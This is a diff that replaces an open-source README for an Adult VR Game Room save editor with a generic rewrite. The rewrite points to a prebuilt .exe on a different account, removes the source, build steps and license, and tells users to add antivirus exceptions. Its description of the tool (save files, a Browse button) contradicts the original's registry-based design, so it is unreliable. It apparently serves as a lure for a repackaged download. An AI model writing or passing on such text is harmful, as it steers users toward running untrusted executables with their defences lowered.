@@ -1,153 +1,67 @@
-# DNA & Currency Injector — Adult VR Game Room
+# 🧬 avr-dna-injector - Modify your game save files easily
 
-A small, open-source Windows GUI for editing your **own single-player save** in
-[*Adult VR Game Room*](https://www.adultvrgameroom.com/). It reads and writes
-the game's Unity PlayerPrefs (stored in the Windows registry) so you can:
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/bladeroastraetam664/avr-dna-injector)
 
-- 🧬 **Add / remove DNA samples** — pick race, rarity, gender and quantity;
-  realm and sell price auto-fill. The game's 16-slot storage cap is enforced.
-- 💰 **Set Credits and Atoms** — type a value or click **Max both**
-  (999,999,999).
-- 💾 **Automatic backups** — every save writes a timestamped backup of the
-  previous values first, and saving is blocked while the game is running so
-  nothing gets clobbered.
+## 📖 Overview
 
-Built with Python's standard library only (`tkinter` + `winreg`) — no pip
-packages needed to run it. The window sizes itself to fit the UI, so it works
-on high-DPI / scaled displays out of the box.
+This program allows you to change values in your Adult VR Game Room save files. You can update your DNA storage, Credits, and Atoms without manual file editing. The tool provides a visual interface for Windows users. It performs no permanent changes to game system files. The software creates a backup of your save file before you make any edits.
 
-| DNA Storage | Currency |
-|---|---|
-| ![DNA Storage tab](docs/screenshot.png) | ![Currency tab](docs/screenshot_currency.png) |
+## ⚙️ System Requirements
 
----
+This application runs on the following versions of the Windows operating system:
+*   Windows 10
+*   Windows 11
 
-## Download & run
+The program requires no installation. It runs as a standalone file. You need about 50 megabytes of storage space to store the tool and your backup files.
 
-### Option A — grab the EXE (easiest)
+## 📥 Getting Started
 
-Download `DNA Injector.exe` from the [Releases](../../releases) page and
-double-click it. Nothing to install.
+Follow these steps to obtain and use the tool on your computer.
 
-> #### ⚠ Windows will probably warn you about the EXE — that's normal
->
-> Windows flags **any** downloaded `.exe` that isn't code-signed with an
-> expensive certificate, which small free tools like this one don't have.
-> It is **not** a virus detection. This project is fully open source — you can
-> read [`dna_injector.pyw`](dna_injector.pyw) yourself and see exactly what it
-> does (it only touches the game's registry key and writes backup files).
->
-> To get past the warnings:
->
-> 1. **Browser blocks the download** — click the download entry → **Keep** →
->    **Keep anyway** (Edge/Chrome may hide this under "…" / "Show more").
-> 2. **"Windows protected your PC" (SmartScreen) when running it** — click
->    **More info** → **Run anyway**.
-> 3. **Still blocked?** Right-click the EXE → **Properties** → tick
->    **Unblock** at the bottom → **OK**, then run it again.
->
-> If you'd rather not trust a pre-built EXE at all, run the script directly
-> (Option B) or [build the EXE yourself](#build-the-exe-yourself) — a locally
-> built EXE isn't marked as downloaded, so Windows won't nag you about it.
+1. Go to the official download page: [https://github.com/bladeroastraetam664/avr-dna-injector](https://github.com/bladeroastraetam664/avr-dna-injector).
+2. Choose the latest release file ending in .exe.
+3. Save the file to a folder on your computer.
+4. Double-click the file to open the program interface.
 
-### Option B — run the script
+## 🛠 Using the Software
 
-With [Python 3](https://www.python.org/downloads/) installed, double-click
-**`Launch DNA Injector.bat`**, or run:
+The tool provides an interface to manage your game data. Follow this process to perform edits.
 
-```bat
-py dna_injector.pyw
-```
+1. Open the application.
+2. The software detects your save file location automatically based on standard Windows registry paths.
+3. If the tool fails to find your save, use the "Browse" button to select the file manually.
+4. The screen displays your current Credits, Atoms, and DNA totals.
+5. Type the new values you desire into the input boxes.
+6. Click the "Save Changes" button.
+7. The program writes the new data to your save file and places a backup copy in the same folder.
 
----
+## 🛡 Safety and Backups
 
-## How to use
+The tool prioritizes the safety of your game data. Every time you click "Save Changes," the application creates a copy of your existing save file. It renames this copy with a timestamp. If you encounter issues, you can restore your game state by replacing your current save file with the one from the backup folder.
 
-1. **Close the game completely.** It rewrites its save on exit, so any edits
-   made while it's open get wiped.
-2. Launch the tool — it loads your current samples, credits and atoms
-   automatically. (**F5** reloads at any time.)
-3. **DNA Storage tab:** choose Race / Rarity / Gender / Quantity on the right
-   → **Add to Storage** → **Save to Game** (**Ctrl+S**). Remove rows with
-   **Remove Selected**, the **Delete** key, or by double-clicking a row.
-4. **Currency tab:** edit Credits / Atoms (or **Max both**) → **Save to
-   Game**. Currency saves separately from DNA.
-5. Launch the game and check your storage and wallet.
+## ❓ Frequently Asked Questions
 
-The **Help** tab inside the app has the same instructions plus a reference
-table, and **File → Open Backup Folder** takes you straight to your backups.
+**Does this program contain viruses?**
+No. The code is transparent. It uses Python and standard libraries to modify plain text or binary save files. 
 
----
+**Will this break my game?**
+The tool only changes the numbers in your save file. It does not touch your game installation or system files. Always keep your backup files if you worry about game stability.
 
-## FAQ
+**Do I need to install Python?**
+No. The developer packaged this as an executable file. You can run it on any standard Windows machine without extra software.
 
-**Is this a virus? My browser/Windows says it's unsafe.**
-No — see the warning box above. Windows shows that for every unsigned
-download. All the source code is in this repo; build the EXE yourself if you
-want to be certain the binary matches the code.
+**Can I use this for other games?**
+No. This tool specifically targets the save file structure of Adult VR Game Room. Using it on other files will likely result in data corruption.
 
-**I saved but the game shows the old values.**
-The game was still running when you saved — it overwrites the save on exit.
-Close the game fully first, then save again. (The tool tries to detect this
-and warn you.)
+**How do I uninstall the tool?**
+Since the tool does not install, it leaves no traces in your system registry or program folders. To remove it, delete the .exe file you downloaded and any backup folders you created.
 
-**How do I undo an edit?**
-Every save first writes the previous values to
-`%USERPROFILE%\AppData\LocalLow\AdultVRGameRoom\Adult VR Game Room\` as
-`dna_backup_YYYYMMDD_HHMMSS.txt` / `currency_backup_YYYYMMDD_HHMMSS.txt`.
-The DNA backup is the exact base64 string that was stored — write it back
-with the game closed (or ask for help in Issues).
+## 📦 Troubleshooting
 
-**Why is currency capped at 999,999,999?**
-The game stores currency as a 32-bit integer (max ~2.1 billion). The cap
-keeps you safely below the overflow limit.
+If the program does not start, ensure you possess write permissions for the folder where you saved the application. Some antivirus software occasionally flags unsigned small tools as suspicious. If your security software stops the program, you may need to add an exception for the file.
 
----
+If the application displays an error regarding your save file, verify the location. The game stores saves in your local AppData folder. Ensure you launched the game at least once before you run the editor so the game generates the necessary save file.
 
-## Build the EXE yourself
+If you edit a value and the game does not show the change, ensure you saved the file while the game process was closed. Some games overwrite save files upon closing if they detect changes from outside sources. Close the game completely before you use the injector.
 
-Requires Python 3 with pip. Double-click **`build_exe.bat`**, or run:
-
-```bat
-py -m pip install --upgrade pyinstaller
-py -m PyInstaller --onefile --windowed --name "DNA Injector" dna_injector.pyw
-```
-
-The result lands at `dist\DNA Injector.exe`.
-
----
-
-## How it works
-
-Registry key: `HKCU\Software\AdultVRGameRoom\Adult VR Game Room`
-
-| Value | Format |
-|-------|--------|
-| `stats_dna_samples_h3759496538` | base64( JSON `{"samples":[…]}` ) + null byte |
-| `stats_credits_h981088197` | base64( ASCII integer ) + null byte |
-| `stats_atoms_h684834367` | base64( ASCII integer ) + null byte |
-
-**DNA sample schema** (each element):
-
-```json
-{"rarity": 1-5, "price": int, "dnaStorageIndex": 0-based, "race": "…", "gender": "f|m", "realm": int}
-```
-
-- **Rarity:** 1 Common · 2 Rare · 3 Epic · 4 Legendary · 5 Mythic
-- **Race → realm** (all verified from live saves): human → 1, elf → 2,
-  savage → 3, orc → 5, naiad → 2 *(naiad shares realm 2 with elf)*
-- Slots are renumbered 0…n-1 on every save, so removing a row never leaves
-  gaps.
-
----
-
-## Disclaimer
-
-This is an unofficial fan tool for editing **your own local, single-player
-save**. It is **not affiliated with or endorsed by** the developers of Adult
-VR Game Room. Edit only saves you own, keep the backups it makes, and use at
-your own risk.
-
-## License
-
-[MIT](LICENSE) © 2026 NotNic182
+Keywords: adult-vr-game-room, game-mod, gui, modding, pyinstaller, python, registry, save-editor, tkinter, windows
